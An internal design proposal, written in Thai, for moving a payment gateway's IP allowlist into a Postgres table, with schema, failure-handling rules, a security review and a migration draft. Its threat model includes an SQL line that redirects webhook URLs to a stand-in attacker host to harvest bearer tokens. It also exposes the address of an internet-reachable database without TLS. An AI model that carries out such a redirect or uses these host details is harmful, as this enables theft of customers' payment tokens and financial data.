# แผน: ย้าย IP allowlist เข้า DB

> **สถานะ: ข้อเสนอ ยังไม่อนุมัติ ยังไม่เริ่มทำ**
> เขียนไว้เพื่อให้กลับมาอ่านและแก้ได้ ไม่ใช่สิ่งที่ตกลงกันแล้วว่าจะทำตามนี้
> ลงวันที่ 2026-09-28

## 1. ปัญหาที่จะแก้

**หลัก**: ทีม support ต้องเรียก dev มา deploy ทุกครั้งที่ต้องเพิ่ม IP ให้ลูกค้าใหม่
การเพิ่ม IP หนึ่งตัววันนี้ = แก้ env + redeploy = flow ทุกตัว restart + drain
นี่เป็นสิ่งเดียวในระบบที่ยังต้อง deploy ทั้งที่ทั้งระบบออกแบบมาให้ไม่ต้อง deploy

**รอง**: รายการปัจจุบันเสื่อมสภาพไปแล้วโดยไม่มีใครเห็น ตรวจ `WISHLIST_IP` ที่ใช้อยู่จริง:

```
ทั้งหมด            92 รายการ
ไม่ซ้ำ             88          ← 51.79.221.97, 51.79.240.120 ซ้ำ 2 รอบ
                                 188.166.242.93 ซ้ำ 3 รอบ
รูปแบบผิด          1           ← 43.228.126.241.152.42.192.121
เป็น private/local  8           ← 192.168.x.x, 10.0.1.13
```

รายการที่รูปแบบผิดคือ `43.228.126.241` กับ `152.42.192.121` ที่ถูกต่อกันด้วย `.` แทน `,`
**ตอนนี้ 2 IP นั้นใช้งานไม่ได้จริงและไม่มีใครรู้** เพราะ string ที่ผิดรูปแค่ไม่เคย match
ไม่มี error ไม่มี log — ปัญหาแบบที่ชนิดข้อมูลใน DB ปฏิเสธได้ตั้งแต่ตอน INSERT

## 2. สิ่งที่ตัดสินใจแล้ว

| คำถาม | คำตอบ |
|---|---|
| ใครควรแก้ได้ | **ทีม support ทำเองได้** ไม่ต้องเรียก dev |
| per-group หรือ global | **global เหมือนเดิม** ไม่แยกว่าใครยิง endpoint ไหนได้ |
| หมุนรหัส Postgres ก่อน | **ทำไม่ได้** |

ผลจากข้อ 2: ลำดับการตรวจใน `handler.go` **ไม่เปลี่ยน** ยังเช็ค IP เป็นขั้นที่ 3
ก่อนหา flow เหมือนเดิม งานลดลงมากและไม่มีเรื่อง 404-vs-403 บอกใบ้ชื่อ group

## 3. สิ่งที่ยังไม่ตัดสิน — ต้องตอบก่อนเริ่ม

**support จะแก้ตารางนี้ด้วยอะไร** ถ้าคำตอบคือ "รัน SQL ตรงเข้า prod DB"
เราแค่ย้ายปัญหา เพราะคนที่แก้ `allowed_ip` ได้ก็แก้ `message_group_url` ได้ด้วย
ซึ่งหมายถึงเปลี่ยนปลายทางของเงินจริงได้

ทางเลือก:
1. **DB user แยกที่ `GRANT` แค่ตาราง `allowed_ip`** — งาน 10 นาที ได้ขอบเขตชัดเจน **แนะนำให้ทำควบคู่ไปเลย**
2. **หน้าเว็บเล็ก ๆ** สำหรับตารางนี้อย่างเดียว — ได้ `created_by` อัตโนมัติ ไม่มีใครต้องแตะ SQL แต่เป็นงานอีกก้อน ค่อยว่ากันทีหลัง

## 4. ดีไซน์

### 4.1 env ∪ DB (union) ไม่ใช่ intersection

```
ALLOWED_IPS (env)  = ชุดฉุกเฉินของทีม ops ไม่กี่ตัว   แก้ต้อง deploy
allowed_ip  (DB)   = รายการใช้งานจริง                support แก้เองได้ทันที

ผ่านชั้นใดชั้นหนึ่งก็เข้าได้
```

**เคยเสนอแบบ intersection ("DB แคบลงได้อย่างเดียว") แล้วถอนไป** เพราะใช้กับงานนี้ไม่ได้จริง:
support ต้องเพิ่ม IP ลูกค้าซึ่งอยู่ที่ไหนก็ได้ รายการปัจจุบัน 88 IP กระจายบน DigitalOcean,
AWS, OVH, Cloudflare และ ISP ไทย ตั้งขอบนอกให้แคบพอจะมีประโยชน์ไม่ได้
ถ้าตั้งกว้างจนใช้งานได้ ขอบนั้นก็ไม่ได้กันอะไร

หน้าที่ของ env ในดีไซน์นี้จึงไม่ใช่ "ขอบ" แต่เป็น **ทางกลับเข้าบ้าน** —
ถ้าวันหนึ่ง support ลบตารางผิดหรือ query พัง ทีม ops ยังเข้าไปแก้ได้โดยไม่ต้อง deploy ฉุกเฉิน
เคสนี้มีโอกาสเกิดสูงกว่า DB ถูกเจาะมาก และเป็นเคสที่ทำให้ระบบล่มจริง

### 4.2 ตาราง

```sql
CREATE TABLE allowed_ip (
    id         BIGSERIAL PRIMARY KEY,
    cidr       CIDR NOT NULL UNIQUE,
    note       TEXT NOT NULL CHECK (btrim(note) <> ''),
    is_active  BOOLEAN NOT NULL DEFAULT true,
    created_by TEXT,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX ON allowed_ip (is_active) WHERE is_active;
```

ชนิด `CIDR` ทำงานให้ 3 อย่างที่ string list ทำไม่ได้:

- **ปฏิเสธรูปแบบผิดตั้งแต่ INSERT** — `43.228.126.241.152.42.192.121` ใส่ไม่เข้า
- **`UNIQUE` กันซ้ำ** — `188.166.242.93` ใส่ได้ครั้งเดียว
- **รองรับ subnet** — 92 รายการปัจจุบันยุบได้ 6 ก้อน เช่น `192.168.1.0/24` แทน 5 บรรทัด

`is_active` แทนการ `DELETE` เพราะถอนคืนได้และเห็นประวัติ
`note` บังคับไม่ให้ว่าง เพราะปัญหาใหญ่ที่สุดของรายการปัจจุบันคือไม่มีใครบอกได้ว่า
IP ไหนของใครและเลิกใช้ได้หรือยัง

### 4.3 การโหลดเข้าหน่วยความจำ

```
reconcile.Once() ─┬─ LoadGroups     (มีอยู่แล้ว)
                  └─ LoadAllowedIPs (ใหม่) ──▶ atomic.Pointer[[]netip.Prefix]
                                                        │
handler.ServeHTTP ──── อ่าน snapshot ───────────────────┘  (ไม่ล็อก ไม่แตะ DB)
```

ใช้รอบเดียวกับ reconcile เพื่อให้ cadence และหลัก "query ล้ม → คงค่าเดิม" เป็นชุดเดียวกัน

**หมายเหตุ**: เคยบอกว่า "ใส่ใน `GroupSpec` แล้ว `Revision()` จะครอบ HotSwap ให้ฟรี" —
จริงเฉพาะกรณี per-group พอเลือก global แล้วมันไม่อยู่ใน `GroupSpec`
ต้องเขียน snapshot holder เอง ราว 40 บรรทัด **ไม่ได้ฟรี**

### เทสต์ที่ต้องมี

- `IsAllowed` กับ CIDR: ตรงตัว, อยู่ใน subnet, อยู่นอก subnet, รายการว่าง
- union: อยู่ใน env อย่างเดียว / อยู่ใน DB อย่างเดียว / อยู่ทั้งสอง / ไม่อยู่เลย
- **query ล้ม → snapshot เดิมต้องไม่ถูกเขียนทับ** (ดู §6)
- query สำเร็จคืน 0 แถว → รายการ DB ว่างจริง แต่ env ยังทำงาน
- `is_active=false` → ตัวนั้นถูกตัดออกจาก snapshot รอบถัดไป

## 6. กับดักที่ต้องเขียนให้ถูกตั้งแต่แรก

**`query ล้ม` ≠ `รายการว่าง`** — ข้อนี้สำคัญที่สุด ถ้าเขียนแบบ build ใหม่ทุกรอบ
แล้ววันหนึ่ง DB ตอบช้าจน timeout คืน 0 แถว **ทุกคนโดนล็อกออกทันทีโดยไม่มีใครแตะอะไรเลย**

```
query สำเร็จ คืน 0 แถว  → รายการ DB ว่างจริง (env ยังใช้ได้ = เข้าได้)
query ล้ม               → คงค่าเดิมไว้ + log เตือน ห้ามเขียนทับ snapshot
```

`reconcile.Once()` ทำหลักการนี้ถูกอยู่แล้วกับ group (คืน error แล้วคง state เดิม) ใช้แบบเดียวกัน

**ห้ามให้ hot path แตะ DB** — การเช็ค IP อยู่ในทุก request ต้องอ่าน snapshot ใน memory
ไม่ใช่ query ต่อครั้ง ไม่งั้นการตัดสินใจเรื่องสิทธิ์จะขึ้นกับว่า DB ยังมีชีวิตอยู่ไหม

**อย่าลืม `TRUSTED_PROXY_COUNT`** — ตารางนี้ไม่ได้แก้เรื่องนั้น `ClientIP` ยังนับจากขวาเหมือนเดิม
ตั้งผิดเมื่อไหร่ allowlist ยังเชื่อถือไม่ได้ไม่ว่าจะเก็บที่ไหน

## 7. เรื่องความปลอดภัย — บันทึกไว้ให้ครบ

**ความเสี่ยงไม่ได้เพิ่มมากอย่างที่ดูเผิน ๆ** คนที่เขียน DB นี้ได้ทำแบบนี้ได้อยู่แล้ววันนี้:

```sql
UPDATE message_group_url SET url = 'https://attacker.example/collect';
```

ทุก request พร้อม `Authorization: Bearer <token>` ของลูกค้าจะวิ่งไปหาเขาภายใน 30 วินาที
เก็บ token ไปยิง goquickpay ตรง ๆ ได้โดยไม่ต้องผ่าน gateway — **allowlist ไม่ได้ป้องกัน
goquickpay อยู่แล้ว** การเพิ่ม IP list ทำให้เขาเปลี่ยนจาก "ต้องรอ traffic จริงวิ่งผ่าน"
เป็น "เริ่มรายการเองได้" ซึ่งแย่ขึ้นจริงแต่เป็นส่วนเพิ่มที่เล็กเมื่อฐานเดิมเป็นแบบนี้

**สถานะของรหัส Postgres** (ตรวจแล้ว 2026-09-28):

```
.env ใน git →  host=database_mq  dbname=mq  port=5432     (ของระบบเก่า hostname ภายใน)
v2 ใช้จริง   →  host=134.209.104.70  dbname=mqdev  port=3457  (รหัสคนละตัว ไม่ได้อยู่ใน git)
```

รหัสของ v2 อยู่ใน `CLAUDE.local.md` (gitignore แล้ว) กับ Easypanel เท่านั้น **ไม่ได้รั่ว**
การหมุนรหัสจึงเป็นงานสุขอนามัยของฝั่ง v1 ไม่ใช่ตัวขวางแผนนี้

## 8. นอกขอบเขตแผนนี้ แต่ควรแก้ก่อนขึ้น prod

**Postgres ตัวนี้ไม่รองรับ TLS เลย** (ทดสอบ 2026-09-28):

```
$ psql "host=134.209.104.70 port=3457 sslmode=require ..."
server does not support SSL, but SSL was required
```

`sslmode=disable` จึงไม่ใช่ตัวเลือกที่ตั้งไว้ แต่เป็นสิ่งเดียวที่ทำได้

**ขอบเขตของปัญหาแคบกว่าที่คิดตอนแรก** ตรวจเพิ่มแล้วพบว่า gateway กับ DB อยู่เครื่องเดียวกัน:

```
deposit-service-mq-v2.ebwved.easypanel.host → 134.209.104.70
DATABASE_URL host=                          → 134.209.104.70
```

traffic ระหว่าง gateway กับ DB จึงไม่ได้ออกอินเทอร์เน็ต ปัญหาไม่ได้อยู่ที่เส้นทางนั้น

**แต่พอร์ต 3457 เปิดรับจากทั้งโลก** — ต่อจากเครื่องในไทยได้ตรง ๆ (ทดสอบแล้ว)
แปลว่าทุกครั้งที่มีคนต่อเข้าไปดูข้อมูลจากข้างนอก **รหัสผ่านและผลลัพธ์ทุก query
เดินทางเป็น plaintext** รวมถึง `request_logs.request_body` ที่มีเลขบัญชี ชื่อบัญชี
และยอดเงินของลูกค้าทุกรายการ

สิ่งที่ควรทำ ไม่ต้องหมุนรหัสและไม่เกี่ยวกับ allowlist:
1. **ปิดพอร์ต 3457 จากภายนอก** ให้เหลือเฉพาะ localhost — gateway ไม่กระทบเพราะอยู่เครื่องเดียวกัน
   ส่วนคนที่ต้องเข้าไปดูข้อมูลใช้ SSH tunnel แทน
2. ถ้าจำเป็นต้องเปิดจริง ๆ ให้จำกัด firewall เป็นรายการ IP

ข้อนี้กระทบน้ำหนักของ §7 โดยตรง: ตราบใดที่พอร์ตยังเปิดให้โลกภายนอกและไม่มี TLS
การเพิ่มของสำคัญเข้าไปใน DB ก็มีความหมายมากขึ้นตามไปด้วย

## 9. สคริปต์ย้ายข้อมูล — ร่าง

```sql
-- ทำความสะอาดตอนย้าย: ตัดซ้ำ ตัดรูปแบบผิด แยก private ออกมาทำเครื่องหมาย
INSERT INTO allowed_ip (cidr, note, created_by)
VALUES ('157.230.247.163', 'ย้ายจาก WISHLIST_IP 2026-09-28 — ยังไม่ทราบเจ้าของ', 'migration')
ON CONFLICT (cidr) DO NOTHING;
-- ... (สร้างจากรายการจริงด้วยสคริปต์ ไม่พิมพ์มือ)
```

**ระหว่างย้ายต้องไล่ถามว่า IP ไหนของใคร** ไม่งั้นจะได้ตารางที่มี `note` เหมือนกันหมด 88 แถว
ซึ่งไม่ต่างจากปัญหาเดิม ถ้าตอบไม่ได้ทั้งหมด อย่างน้อยต้องแยกกลุ่มว่าเป็นของ server ตัวไหน

ก่อนตัด `WISHLIST_IP` ทิ้ง ให้รันคู่กันไปสักพักแล้วเทียบว่า `client_ip` ใน `request_logs`
มีตัวไหนที่ไม่อยู่ในตารางใหม่บ้าง:

```sql
SELECT DISTINCT client_ip, count(*), max(created_at)
FROM request_logs WHERE created_at > now() - interval '30 days'
GROUP BY client_ip ORDER BY count DESC;
```

ข้อมูลชุดนี้คือคำตอบจริงว่าใครใช้งานอยู่ ต่างจากรายการ env ที่สะสมมาโดยไม่มีใครลบ
